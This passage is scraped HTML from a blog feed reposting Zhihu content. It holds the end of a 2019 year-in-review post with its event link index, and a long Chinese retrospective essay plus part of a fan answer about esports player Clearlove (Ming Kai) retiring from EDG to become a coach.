data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-fee3e27abd7d942f4e15da42b3271b4e_r.jpg" data-src="https://pic3.zhimg.com/v2-fee3e27abd7d942f4e15da42b3271b4e_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-fee3e27abd7d942f4e15da42b3271b4e_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-fee3e27abd7d942f4e15da42b3271b4e_b.jpg" data-lazy-status="ok" data-src="https://pic3.zhimg.com/80/v2-fee3e27abd7d942f4e15da42b3271b4e_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p><b>感谢一切难题，让答案来得更有份量</b></p><p>从 1949 到 2019</p><p>你，你们，我，我们，他，他们</p><p>经风雨也一同见证这盛世</p><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-cc60f093790c99d1d2528277cfbfa272_r.jpg" data-src="https://pic3.zhimg.com/v2-cc60f093790c99d1d2528277cfbfa272_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1920" data-rawheight="1080" class="origin_image zh-lightbox-thumb lazy lazyload" width="1920" data-original="https://pic3.zhimg.com/v2-cc60f093790c99d1d2528277cfbfa272_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-cc60f093790c99d1d2528277cfbfa272_b.jpg" data-lazy-status="ok" data-src="https://pic3.zhimg.com/80/v2-cc60f093790c99d1d2528277cfbfa272_hd.jpg"></figure><figure data-size="normal"><noscript><img data-caption data-size="normal" data-rawwidth="1163" data-rawheight="654" class="origin_image zh-lightbox-thumb lazyload" width="1163" data-original="https://pic4.zhimg.com/v2-7decbb6a588c2f490f4374863fb62a1b_r.jpg" data-src="https://pic4.zhimg.com/v2-7decbb6a588c2f490f4374863fb62a1b_b.jpg"></noscript><img data-caption data-size="normal" data-rawwidth="1163" data-rawheight="654" class="origin_image zh-lightbox-thumb lazy lazyload" width="1163" data-original="https://pic4.zhimg.com/v2-7decbb6a588c2f490f4374863fb62a1b_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-7decbb6a588c2f490f4374863fb62a1b_b.jpg" data-lazy-status="ok" data-src="https://pic4.zhimg.com/80/v2-7decbb6a588c2f490f4374863fb62a1b_hd.jpg"></figure><p class="ztext-empty-paragraph"><br></p><p>正在经历也即将过去的 2019</p><p>我们做好了漫长告别的准备</p><p>告别往复的时光和一些成人世界的「难」</p><p><b>知者无畏，知难而上</b></p><p>你好 2020</p><p class="ztext-empty-paragraph"><br></p><p>时间把已经发生的故事悄然搬离</p><p>但我们会记得</p><p>这是偶有荆棘却用「奇迹」披荆斩棘的十年</p><p>我们也要终要去创造下一个十年的未完待续</p><p>连同一些当初不悔的抉择</p><p>连同一些可抵岁月漫长的热爱</p><p><b>你好 下一个十年</b></p><p class="ztext-empty-paragraph"><br></p><hr><p><b>视频事件索引：</b></p><p>1、<a href="https://www.zhihu.com/question/307791077" class="internal" data-za-detail-view-id="1043">嫦娥四号成功着陆月球背面有什么重要意义？</a></p><p>2、<a href="https://www.zhihu.com/question/341908130" class="internal" data-za-detail-view-id="1043">亚马逊雨林大火十天会对地球产生什么影响？</a></p><p>3、<a href="https://www.zhihu.com/question/320308018" class="internal" data-za-detail-view-id="1043">巴黎圣母院突发火灾将产生怎样的影响？</a></p><p>4、<a href="https://www.zhihu.com/question/350043460" class="internal" data-za-detail-view-id="1043">如何看待 10 月 10 日无锡 312 国道高架倾覆事故？</a></p><p>5、<a href="https://www.zhihu.com/question/344397424" class="internal" data-za-detail-view-id="1043">男篮世界杯无缘东京奥运会，你有什么想说的？</a></p><p>6、<a href="https://www.zhihu.com/question/331830643" class="internal" data-za-detail-view-id="1043">宋仲基宋慧乔协议离婚，你有什么想说的？</a></p><p>7、<a href="https://www.zhihu.com/question/334238993" class="internal" data-za-detail-view-id="1043">如何看待 9 岁女童被租客带走，且租客自杀一事？</a></p><p>8、<a href="https://www.zhihu.com/question/352171277" class="internal" data-za-detail-view-id="1043">大连 10 岁女孩疑被 13 岁男学生杀害，案件调查进展如何？</a></p><p>9、<a href="https://www.zhihu.com/question/313564280" class="internal" data-za-detail-view-id="1043">第一批马上奔三的 90 后现在是什么样的状态？</a></p><p>10、<a href="https://www.zhihu.com/question/36892778" class="internal" data-za-detail-view-id="1043">如何看待互联网公司 996 现象，是种什么样的体验？</a></p><p>11、<a href="https://www.zhihu.com/question/318346341" class="internal" data-za-detail-view-id="1043">如何看待杭州小伙单车逆行被抓，接电话后崩溃爆哭？</a></p><p>12、<a href="https://www.zhihu.com/question/357980222" class="internal" data-za-detail-view-id="1043">艺人高以翔在录制节目抢救无效去世，发生了什么？</a></p><p>13、<a href="https://www.zhihu.com/question/350675490" class="internal" data-za-detail-view-id="1043">崔雪莉确认身亡，事情的真相如何？</a></p><p>14、<a href="https://www.zhihu.com/question/353884118" class="internal" data-za-detail-view-id="1043">如何看待锤子科技 CEO 罗永浩被限制高消费？</a></p><p>15、<a href="https://www.zhihu.com/question/324736734" class="internal" data-za-detail-view-id="1043">极限生存的假设成为现实，科技自立意味什么？</a></p><p>16、<a href="https://www.zhihu.com/question/340424050" class="internal" data-za-detail-view-id="1043">如何看待环球时报记者付国豪在香港机场的遭遇及后续？</a></p><p>17、<a href="https://www.zhihu.com/question/329189281" class="internal" data-za-detail-view-id="1043">羽毛球名将李宗伟宣布退役，如何评价他的职业生涯？</a></p><p>18、<a href="https://www.zhihu.com/question/319053644" class="internal" data-za-detail-view-id="1043">如何评价《青春有你》第十二期总决赛？</a></p><p>19、<a href="https://www.zhihu.com/question/311841841" class="internal" data-za-detail-view-id="1043">如何评价腾讯综艺《创造营 2019》？</a></p><p>20、<a href="https://www.zhihu.com/question/331546953" class="internal" data-za-detail-view-id="1043">如何评价影视剧《陈情令》？</a></p><p>21、<a href="https://www.zhihu.com/question/328571237" class="internal" data-za-detail-view-id="1043">如何评价电影《少年的你》？</a></p><p>22、<a href="https://www.zhihu.com/question/345307809" class="internal" data-za-detail-view-id="1043">如何评价周杰伦发布的新歌《说好不哭》？</a></p><p>23、<a href="https://www.zhihu.com/question/310186247" class="internal" data-za-detail-view-id="1043">如何评价动画电影《哪吒之魔童降世》？</a></p><p>24、<a href="https://www.zhihu.com/question/346282105" class="internal" data-za-detail-view-id="1043">看过电影《中国机长》后，你有什么感想？</a></p><p>25、<a href="https://www.zhihu.com/question/312591983" class="internal" data-za-detail-view-id="1043">如何评价苏炳添夺伯明翰室内大赛 60 米冠军？</a></p><p>26、<a href="https://www.zhihu.com/question/350351013" class="internal" data-za-detail-view-id="1043">如何看待基普乔格以 1 小时 59 分 40 秒破 2 成功？</a></p><p>27、<a href="https://www.zhihu.com/question/354106324" class="internal" data-za-detail-view-id="1043">孙杨听证会于 11 月 15 日举行，透露了哪些信息？</a></p><p>28、<a href="https://www.zhihu.com/question/299127794" class="internal" data-za-detail-view-id="1043">如何评价爱奇艺《乐队的夏天》？</a></p><p>29、<a href="https://www.zhihu.com/question/355167705" class="internal" data-za-detail-view-id="1043">如何看待 FPX 3:0 击败 G2，中国战队再夺 S 赛冠军？</a></p><p>30、<a href="https://www.zhihu.com/question/348219798" class="internal" data-za-detail-view-id="1043">中国女排第十次夺取世界冠军，你有什么想说的？</a></p><p>31、<a href="https://www.zhihu.com/question/342172376" class="internal" data-za-detail-view-id="1043">看完电影《我和我的祖国》，你有什么感想？</a></p><p>32、<a href="https://www.zhihu.com/question/348515819" class="internal" data-za-detail-view-id="1043">2019 年 10 月 1 日新中国成立 70 周年国庆大阅兵有哪些亮点？</a></p><p>33、<a href="https://www.zhihu.com/question/318657727" class="internal" data-za-detail-view-id="1043">如何评价电影《复仇者联盟 4 ：终局之战》？</a></p><p>34、<a href="https://www.zhihu.com/question/284128568" class="internal" data-za-detail-view-id="1043">如何评价刘慈欣小说改编的同名电影《流浪地球》？</a></p><p>35、<a href="https://www.zhihu.com/question/318763133" class="internal" data-za-detail-view-id="1043">人类首张黑洞照片即将发布，可能会有什么重要影响？</a></p><p></p></div>]]></content>
      
      
      <categories>
          
          <category> 感情生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2019 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EDG 官宣 Clearlove（明凯）正式退役成为教练，你有什么想说的？</title>
      <link href="Clearlove.html"/>
      <url>Clearlove.html</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><h1 id="EDG-官宣-Clearlove（明凯）正式退役成为教练，你有什么想说的？"><a href="#EDG-官宣-Clearlove（明凯）正式退役成为教练，你有什么想说的？" class="headerlink" title="EDG 官宣 Clearlove（明凯）正式退役成为教练，你有什么想说的？"></a>EDG 官宣 Clearlove（明凯）正式退役成为教练，你有什么想说的？</h1><p>&emsp;&emsp;“一片树林里分出两条路，而我选择了人迹更少的一条。” “从此决定了我一生的道路。”明凯退役了。在转会期的最后一天爆出这样的消息，即在意料之外，又在情理之中，八年前走上电子竞技这条道路，七年前为中国拿下第一个英雄联盟世界冠军 ，六年前从WE加入EDG，四年前为LPL拿下第一个官方赛事奖杯，三年前被挂上4396的名号，两年前开始将担子转给后辈，一年前在台下看着小将带领EDG冲向世界舞台。今年正式划上句号。厂长 、诺言 、MSI总MVP 、LPL第一打野 、艾欧尼亚深夜屠杀者 。反向证明世界第一打野 、4396 、马踏飞箭 、鱼死网破 、NMSLWSND 。前者是明凯，后者也是明凯，好也罢，坏也罢，走过八年职业生涯，很多荣辱和过去都已经被时间彻底冲散。该打过的仗都已经打过了，当击败的敌人都已经击败了，该守住的荣誉也已经守住了，自此以后，自有王者的冠冕为他存留 。名为选手的人生，已经结束。名为教练的征途，才刚刚开始。1.明凯的职业生涯，是由一款叫《信长野望》的游戏开始的，我们无需关注这款游戏的地位到底达到了什么地步，我们只需要知道LPL最早一批职业选手有不少都出自于此，包括明凯、无状态、卷毛等一系列老选手都是出自于此。而明凯离开信长野望转LOL的原因也非常简单——因为信长野望让他活不下去。站在今天的角度上，我们或许会觉得他走上职业这条路是为了梦想。但客观地说，在当时那个电子竞技远没有发展起来的时代，对于大多数早期的职业选手而言，梦想远远不及一张长期饭票重要。<img data-caption data-size="normal" data-rawwidth="453" data-rawheight="395" data-default-watermark-src="https://pic2.zhimg.com/50/v2-d466972b1fefa8c5bbe976903005f8fc_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="453" data-original="https://pic2.zhimg.com/v2-a599abe988f98383016856f783e842fe_r.jpg" data-src="https://pic2.zhimg.com/50/v2-a599abe988f98383016856f783e842fe_hd.jpg">&emsp;&emsp;世界冠军选手穿着皱巴巴的队服去挤地铁拉赞助，累的睡在人来人往的车厢里。一顿李庄白肉成为几个年轻小伙一辈子挥之不去的回忆，即使后来分道扬镳也记得清晰无比。无关梦想，无关荣誉，这才是那年电子竞技的残酷现状。而明凯加入的前两个战队，都不是那么有趣，其中一支战队的名字叫”蓝BiuBiu”，战队图标充满了二次元的气息，这支战队只存在了不到半年，后来被Team Phoenix战队 带走了其中大量队员。<img data-caption data-size="normal" data-rawwidth="156" data-rawheight="159" class="content_image lazyload" width="156" data-src="https://pic4.zhimg.com/50/v2-1bb6c01e6f1a671fb942d1ec29999615_hd.jpg">&emsp;&emsp;当然，Team Phoenix同样没有存在太久，否则今天的FPX战队或许还需要换一个名字，在8月加入WE战队后，他终于开始有了一份稳定的收入，按照上单草莓在退役后的曝光来看，这份收入并不算高，但作为职业生涯的开始，进入当时国内堪称豪门的WE俱乐部，无论如何都是一个相当不错的起点。<img data-caption data-size="normal" data-rawwidth="600" data-rawheight="400" data-default-watermark-src="https://pic3.zhimg.com/50/v2-99efab80ecb16f2e65795208fb54c8b6_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="600" data-original="https://pic3.zhimg.com/v2-56328e0fa0c84f5efe0f0160b20f7916_r.jpg" data-src="https://pic3.zhimg.com/50/v2-56328e0fa0c84f5efe0f0160b20f7916_hd.jpg">&emsp;&emsp;起点有了，结果却未必会太好，S2是一个非常有趣的时代，英雄联盟在全球尚没有搭建完整的联赛体系，大多数战队除了夺冠和赞助以外不会有太多收入。而鱼龙混杂的赛事又让大多数比赛到最后都成为了全球选手大乱斗的修罗场。风起云涌的赛场，日新月异的体系，加上拳头对于早期游戏版本和赛事力度都掌控不足，让WE对整个S2世界赛都无所适从。八小时的网线大战耗干了WE的精力，而道歉在老WE四位选手退役后才姗姗来迟。当然，这不重要。那年在拉斯维加斯，WE依旧一路过关斩将夺得了IPL末代冠军，先后击败了FNC、CLGEU、M5等多支强队的他们已经证明了自己的实力，国服客户端也增加了WE战队的永久免费头像。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="333" data-default-watermark-src="https://pic3.zhimg.com/50/v2-0280aa2f84827a4c4b01245ca822c2a3_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic3.zhimg.com/v2-14f350dfdc2f9d84db231be7d0f9feb9_r.jpg" data-src="https://pic3.zhimg.com/50/v2-14f350dfdc2f9d84db231be7d0f9feb9_hd.jpg">&emsp;&emsp;在S3那个英雄联盟肆无忌惮扩张的时候，WE头像是很多玩家的首选，甚至延续至今。但对于大多数玩家来说，那个时代的明凯并不出彩，相对于落地金身的若风，韩国队伍塔下跳舞嘲讽的草莓，乃至于号称国服第一机器人的卷毛和世界顶级ADC微笑。那个在前期被反野导致大逆风，最终强行顶起400真视药水强做视野的明凯，确实不够耀眼。但良好的开始，也往往是一个枷锁。2.2012的夺冠，给WE带来荣誉的同时，也带来了枷锁，中单实力下滑让WE无法保持以往的压制能力，下路的优势虽然依旧满满，但S3是一个刺客横冲直撞的版本。除了老对手IG和二队PE外，WE已经无法击败OMG和皇族这两个对手，春季赛进入季后赛憾负OMG的WE甚至无法击败IG这个老对手。被Ban掉寡妇的明凯在野区内横冲直撞，却无法保证比赛的胜利，骨子里渴望胜利的选手们内部很快爆发了冲突。很多队内冲突可以掩盖，但WE不行，因为我们马上就在赛场上看到了这一刻。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="359" data-default-watermark-src="https://pic4.zhimg.com/50/v2-b2478935e30da9215c0fef40a9172605_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic4.zhimg.com/v2-08140ec1fbcdbc4a8077a4166768cff1_r.jpg" data-src="https://pic4.zhimg.com/50/v2-08140ec1fbcdbc4a8077a4166768cff1_hd.jpg">&emsp;&emsp;2013年8月16日，LPL夏季赛WE vs LMQTC的比赛中，明凯和若风互换位置，明凯中单，若风打野，但这种临阵换位置自然不会有什么好事，作为联赛末流队伍的LMQTC轻松击败了WE并且打出了碾压性优势。这场比赛带来了两个灾难性的后果。1.因为被LMQ在常规赛多拿了一分的原因，WE以一分之差未能进入LPL夏季赛季后赛，而未进入夏季赛季后赛则丧失进入全球总决赛预选赛的机会。虽然进入了也不一定能从当时状态火热的OMG和皇族身上抢下名额，但没进入终究是没有进入。2.因为未能进入全球总决赛预选赛，丧失了进入全球总决赛的机会，WE五人内部矛盾进一步扩大，直接导致世界赛期间以及后续WCG相关的事件爆发。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="404" data-default-watermark-src="https://pic1.zhimg.com/50/v2-c08d84636d502692b6f0c7bc2dfe84cf_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic4.zhimg.com/v2-82fde92166b9a393cc73229617f4cb22_r.jpg" data-src="https://pic4.zhimg.com/50/v2-82fde92166b9a393cc73229617f4cb22_hd.jpg">&emsp;&emsp;即使是当事人在那时，也很难评价双方的对错，在2019年已经稀松平常的离队转会，在2013年似乎是有些罪大恶极的事情，不管选手私下如何，在微博上掀起的大战一时成为了年末最”精彩”的风景——即使几位选手在不久之后就冰释前嫌。无论怎么说，明凯和卷毛以及阿布的离队，对于当时的LPL来说并不算是坏事，WE的没落至少在那个时代已经无法阻止，而卷毛、明凯和阿布三人的出走，加上从PE转会而来的Namei以及曾经作为LM战队中单击败了他们的U，统治了LPL长达一年半的超级战队EDG诞生了。这支队伍在2019年确实战绩不佳，但在2014年建队开始到2018年末，EDG都一直是LPL最具竞争力的队伍之一，甚至在很长一段时间里，这个之一也可以去掉。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="444" data-default-watermark-src="https://pic4.zhimg.com/50/v2-0f11fb981e223895281cec79fd93ec7a_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic2.zhimg.com/v2-9bd2b753015e462f85a299378a280df6_r.jpg" data-src="https://pic2.zhimg.com/50/v2-9bd2b753015e462f85a299378a280df6_hd.jpg">&emsp;&emsp;一手将这个王朝打造而出的正是明凯，而在接下来的时间里，他依旧会亲手掌握这个他打造而出的巨轮继续前行。当然，这就是另一个故事了。3.2015年的EDG和明凯，都到了历史上最巅峰的状态，运营赛季让EDG的打法如鱼得水，而意识和操作乃至于职业经验都处于巅峰的明凯也开始在赛场上大杀四方。那年的他强到什么地步？LPL联赛历史上打野最高击杀记录并不是大多数人想象中的瞎子、狮子狗、螳螂、千珏此类英雄，甚至不是皇子、酒桶、奥拉夫这一类战士英雄，而是猪妹。<img data-caption data-size="normal" data-rawwidth="572" data-rawheight="341" data-default-watermark-src="https://pic3.zhimg.com/50/v2-f270a0181533b2597e21fb64af1aee05_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="572" data-original="https://pic1.zhimg.com/v2-415a4e40bd0e51cafbd1cd35911c803e_r.jpg" data-src="https://pic1.zhimg.com/50/v2-415a4e40bd0e51cafbd1cd35911c803e_hd.jpg">&emsp;&emsp;我知道这个结论会让大多数人惊掉眼镜，但这个记录确实是明凯2015年4月10日对VG的比赛中创造出来的。春季赛将自己一身实力发挥到顶峰的明凯打出了无数经典操作，猪妹15杀打崩VG、十分钟连续上中下三路狂抓21分钟打爆LGD，从有惩戒的努努手下抢到大龙最终让EDG夺得2015年春季赛冠军——那也是EDG夺得的最后一个春季赛冠军。我们不知道站在佛罗里达州立大学的场馆中，这位已经在英雄联盟里奋战了四年的职业选手是什么想法，但最终锁下寡妇的那一刻，以及对队员们的坚定眼神和话语，都说明了一件事：他来到这个地方，目的就是为了屠神。”We BO5 king，WE ，LGD，NOW SKT”漫天彩带落下，EDG最终3：2击败SKT拿下世界冠军，明凯在第一的2015年MSI季中邀请赛冠军的同时，也获得了季中邀请赛总MVP，而一直到今天为止，这都是LPL战队惟一一次在番战中击败SKT。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="417" data-default-watermark-src="https://pic3.zhimg.com/50/v2-c2a34e4670a5a660c4c36f979d4e90d9_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic1.zhimg.com/v2-a109431c8281ca60ce3374d5df49bd2c_r.jpg" data-src="https://pic1.zhimg.com/50/v2-a109431c8281ca60ce3374d5df49bd2c_hd.jpg">&emsp;&emsp;2015年季中邀请赛的出征曲叫做《Hero》，是时任IG中单宋义进（Rookie）和时任OMG中单余家俊（Cool）共同演唱。在MV的最后，音乐结束的时候，明凯对着镜头竖起了自己的大拇指。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="356" data-default-watermark-src="https://pic2.zhimg.com/50/v2-3973c1a4c6179d2fc5707a1d7a974c05_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic4.zhimg.com/v2-7c33348876a6dcb783610adfab4a5ad0_r.jpg" data-src="https://pic4.zhimg.com/50/v2-7c33348876a6dcb783610adfab4a5ad0_hd.jpg">&emsp;&emsp;相对于两年前他在全明星宣传的MV当中骄傲的说到”要证明谁才是世界第一打野。”这次他只是和其他队员一样，竖起了自己的大拇指。想要证明自己是世界第一打野，赛场上却成为了别人的背景板，成就瞎王inSec英名。平静的竖起大拇指带领队员远征佛罗里达，寡妇绝杀击败SKT，成为真正的第一打野。但让很多人没有想到的是，塔拉哈西的奖杯就已经是很多故事的终点。EDG和明凯，再也没达到过同样的高度。4.对于任何一个EDG粉丝而言，2015年MSI后的EDG，无论怎么谈都是一言难尽，在2018年IG夺得S8世界赛冠军之前，EDG一直是LPL外战成绩最好的队伍——RNG最多也只做到了平起平坐。但LPL的颓势以及EDG在联赛内部还不错的成绩，让很多压力也来到了EDG身上。”内战内行”的帽子一旦扣上，就很难再拿下来了，强大的舆论迫使EDG对自己稳健运营的节奏做出改变，在对外作战采用越来越激进的打法，但赛区的整体劣势让绝大多数队伍在外战时都堪称无力回天。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="400" data-default-watermark-src="https://pic1.zhimg.com/50/v2-119b89270e8e35f760ea31a6c317bcf4_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic2.zhimg.com/v2-610e73ca5768cb4ead3f7f995c412287_r.jpg" data-src="https://pic2.zhimg.com/50/v2-610e73ca5768cb4ead3f7f995c412287_hd.jpg">&emsp;&emsp;天塌下来自然要高个子顶着，作为LPL”最高”的EDG，被诟病非常正常，而在EDG里”最高的”明凯，各种各样的节奏自然会接踵而来。4396对于一个劣势局打野来说并不算奇怪，毕竟劣势局即使是C位也可能打不出多少输出，但朗朗上口外加玩家对失败的不满，让节奏迅速发酵，马踏飞箭虽然堪称经典一梗，但那场比赛EDG并没有输掉比赛，甚至”马踏飞箭”的明凯，那场比赛还拿下了堪称完美的1/0/8数据。但这并不重要，人们总是需要一个发泄口的。随之而来的S7全球总决赛小组赛三拿卢锡安被淘汰，让EDG彻底站在了风口浪尖之上，虽然现在的”御三家”都有小组赛被淘汰的历史（IG2015年、RNG2019年），但EDG这次的时间和地点都太不巧了一些。连续的成绩下滑让EDG不得不做出改变，年龄已经变大的明凯也逐渐开始淡出赛场。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="294" data-default-watermark-src="https://pic4.zhimg.com/50/v2-d12220f26226bad2d1388ccfa5a76043_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic2.zhimg.com/v2-ecea53362f79927d3a3e33b75039dd85_r.jpg" data-src="https://pic2.zhimg.com/50/v2-ecea53362f79927d3a3e33b75039dd85_hd.jpg">&emsp;&emsp;2018年春季赛尚可算是主力，到夏季赛的后期就基本上由Haro上场，冒泡赛9场比赛的表现让Haro稳住了自己在世界赛的地位，直到2019年EDG的彻底落寞。在2019年夏季赛，即使是最危机的时候，EDG依旧选择了新打野Jiejie上场，让明凯稳稳坐在了替补席上，已经说明了他接下来的去程。作为一名已经26岁的大龄选手，他已经没有再去试错的机会了。喜欢也好，不喜欢也罢，春季赛季后赛面对SDG那次被3：0，就是他在赛场上留下的最后痕迹，IPL5上逆风顶起400的茂凯，全明星上不知所措的人马，S4全球总决赛上绝望退场的螳螂，2015年强行抢龙的雷克赛，绝杀大魔王妖姬连胜纪录的恐怖寡妇，被自己”粉丝”盲僧当成背景板的蜘蛛，让二追三关键局EQ闪挑起对手的皇子，还有那个在最后一场比赛里无力回天的酒桶。<img data-caption data-size="normal" data-rawwidth="640" data-rawheight="435" data-default-watermark-src="https://pic3.zhimg.com/50/v2-b71a3a4a68212197490a60684a68d562_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="640" data-original="https://pic1.zhimg.com/v2-ca4ad677a37519c505bc0c575664f34e_r.jpg" data-src="https://pic1.zhimg.com/50/v2-ca4ad677a37519c505bc0c575664f34e_hd.jpg">&emsp;&emsp;年少成名，打职业第一年就夺得世界冠军，本来应该是主角剧本。呕心沥血，背负骂名换队抗韩绝杀大魔王，无论如何都难以忘记。拥有了该拥有的荣誉，击败了能击败的敌人，从LPL赛区建立开始走到今天，无论奖杯、荣誉还是知名度，都堪称LPL唯二存在 。但我们回顾这一段故事，却只留下了一段回忆和一声叹息。没能在职业生涯最后用一场战斗为自己退役划上句号，终究不是那么完美。5.18岁的明凯决定走上电子竞技这条道路，21岁的明凯用自己的双手开辟了完全不同的人生。或许对大多数粉丝来说，”背叛”WE前往EDG是一个不光彩的开始，而获得荣誉后的描述也更像是成王败寇的无趣语言。但在那个秋天的晚上他做出选择那一刻起，渴望胜利的灵魂就已经开始燃烧，成为铸就冠军奖杯的燃料。这条路痛苦、无趣又带着辉煌，即使结局会有些不尽人意，但正如弗罗斯特那首诗一样。“一片树林里分出两条路，而我选择了人迹更少的一条。” “从此决定了我一生的道路。”名为选手的人生，已经结束。名为教练的征途，才刚刚开始。作者：瓦罗兰文艺复兴联合会—— @框框框子编辑于昨天 21:12​赞同 9K​​419 条评论​分享​收藏​感谢​收起​吧啦是一只兔子/Lolita/JK制服/LOL/一拳一个装病狗1,319 人赞同了该回答“有人说电竞是青春饭，那我的青春，可能会久一点。”<img data-rawwidth="1620" data-rawheight="1080" data-size="normal" data-default-watermark-src="https://pic1.zhimg.com/50/v2-08659bdbc2ece03c68b2a6648b6f2ac0_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="1620" data-original="https://pic1.zhimg.com/v2-a55398a385406973c4d5c74a45039d17_r.jpg" data-src="https://pic1.zhimg.com/50/v2-a55398a385406973c4d5c74a45039d17_hd.jpg">&emsp;&emsp;12月16日，EDG选手Clearlove正式宣布退役，转型EDG教练。——这位26岁的LPL活化石，见证了LPL所有人同一起跑线的锐气，和被LCK统治的萎靡，到如今的世界第一赛区。他带着无数的赞誉和诋毁，确确实实地从舞台上落幕了。我是S6初开始入坑，作为一个萌新尝试着去了解英雄联盟。S5总决赛当时已经结束，铺天盖地的质疑和指责让我认识了EDG。之后每年世界赛EDG都承受着比上一年更多的舆论风暴，诺言成了万众瞩目也成了漩涡中心。在这样的环境下我也成了一名黑粉，内战幻神，4396，你号没了，克里尔辣舞，鱼死网破，马踏飞箭……lpl梗共十斗，厂长独占七斗。曾经不可一世的EDG摇摇欲坠，S7世界赛WE和RNG势如破竹，在麻辣香锅绝食型打野的反衬下，Clearlove7在舆论风暴中成了废物的代名词。那个7看起来如此讽刺，他所谓的梦想在很多人眼里只是舍不得名利。S7之后改朝换代，大家的聚焦点都在RNG，IG，FPX。EDG，那是谁？而我第一次意识到自己没那么讨厌明凯时，是王者荣耀一个我想不起来名字的选手，他所在的战队故意拿“诺言”和“辣个男人”的梗来发微博，他的女粉丝们嘲讽明凯不过是没有知名度的野鸡选手，他们的偶像才配叫诺言。哪怕作为一名激进厂黑，我也着实被恶心到了，当时我还在微博和那个王者荣耀选手的女粉对线了好几回。明凯的女粉说，“要守护全世界最好的诺言”。我只当脑残粉的肉麻言论，但我开始放下偏见去了解这个选手，才发现他不仅没我想象中那么菜，相反他至今都有着不容忽视的统治力——尽管他真的年纪大了。那次后我反省我自己，不了解一个选手的成就，不去肯定他有过的成绩，有什么资格说三道四呢？——<img data-rawwidth="580" data-rawheight="580" data-size="normal" data-default-watermark-src="https://pic4.zhimg.com/50/v2-2533f3abd69072d0cd8677d61b109460_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="580" data-original="https://pic2.zhimg.com/v2-a503766a44ee2b6312d4e2cb975990e3_r.jpg" data-src="https://pic2.zhimg.com/50/v2-a503766a44ee2b6312d4e2cb975990e3_hd.jpg">&emsp;&emsp;明凯不完全统计成就S2加入WE，彼时国内英雄联盟刚刚起步，这个梦幻般的战队夺得了IPL5世界冠军，玩家们头像选择里有了WE，——LPL向世界展示的第一道锋芒。S4转会新生队伍EDG，成为LOL职业联赛上第一次获得LPL春季赛和LPL夏季赛双冠军的队伍，同年获得德玛西亚杯冠军。S5EDG战队获得LPL春季赛冠军，对战LGD被称为“中国赛区史上最强BO5 ”，逆风、翻盘、视野控制、节奏、极限大五个、抢大龙、五杀，所有振奋人心的表现都在这场比赛中体现得淋漓尽致，是曾经在中国赛区能看到最巅峰的对决。明凯最终抢掉大龙，解说狂喊: 扶大厦之将倾，挽狂澜于既倒， 厂长真男人。同年MSI夺得冠军，打破LCK在世界性赛事的冠军垄断地位，同时这也是LPL第一次在拳头官方举办的全球性赛事中摘得桂冠。明凯成为中国第一位两次夺得LOL世界冠军的选手，赛事官方评为MVP。S6EDG战队获得LPL夏季赛冠军，明凯再次KDA榜单第一，自15年开始到今年，凡是Clearlove出场次数超过20场的比赛，他的KDA在打野位始终第一。S7EDG战队获得LPL夏季赛冠军，果断的二级抓下阻止了RNG的造神之路。MSI用百分百胜率的寡妇，终结了Faker百分百胜率妖姬的不败传说。英特尔公司请厂长代言广告，公开承认了LOL的地位，也有了那句经典名言——“世界聚焦于你。”<img data-rawwidth="2048" data-rawheight="1365" data-size="normal" data-default-watermark-src="https://pic3.zhimg.com/50/v2-e72b2bdbde083ece18535ee55d8161e3_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="2048" data-original="https://pic1.zhimg.com/v2-554a9a27388d86590947a4ee5c1eee15_r.jpg" data-src="https://pic1.zhimg.com/50/v2-554a9a27388d86590947a4ee5c1eee15_hd.jpg"><img data-rawwidth="459" data-rawheight="347" data-size="normal" data-thumbnail="https://pic4.zhimg.com/50/v2-4972e9b99928aa97330d1fc3153749e6_hd.jpg" class="origin_image zh-lightbox-thumb lazyload" width="459" data-original="https://pic4.zhimg.com/v2-4972e9b99928aa97330d1fc3153749e6_r.jpg" 